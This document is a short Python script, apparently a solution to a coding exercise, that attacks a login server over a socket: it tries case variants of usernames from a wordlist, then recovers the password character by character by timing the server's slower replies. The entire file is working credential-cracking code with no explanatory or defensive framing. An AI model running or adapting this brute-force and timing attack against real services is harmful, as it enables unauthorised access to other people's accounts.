import sys
import socket
import json
import itertools
import string
import time

args = sys.argv
characters = list(string.ascii_letters + string.digits)


def letter_case_permutations(s):
    options = [[char.lower(), char.upper()] if char.isalpha() else [char] for char in s]
    combinations = itertools.product(*options)
    results = ["".join(combination) for combination in combinations]
    return results


def send(login, password, client):
    message = {"login": login, "password": password}
    message_j = json.dumps(message)
    message_j = message_j.encode()
    client.send(message_j)


def receive(client):
    message_j = client.recv(1024).decode()
    message = json.loads(message_j)
    return message["result"]


with socket.socket() as client:
    address = (args[1], int(args[2]))
    client.connect(address)
    response = "Wrong password!"

    with open("logins.txt", "r", encoding="utf-8") as login:
        for line in login:
            line = line.strip()
            login_list = letter_case_permutations(line)
            for login_try in login_list:
                send(login_try, "password", client)
                response = receive(client)
                if response != "Wrong login!":
                    login = login_try
    password = " "
    for i in range(20):
        for c in characters:
            pass_try = (password + c).strip()
            send(login, pass_try, client)
            start_time = time.time()
            response = receive(client)
            end_time = time.time()
            interval = end_time - start_time
            if response == "Connection success!":
                message = {"login": login, "password": pass_try}
                print(json.dumps(message))
                sys.exit()
            elif interval > 0.01:
                password = pass_try
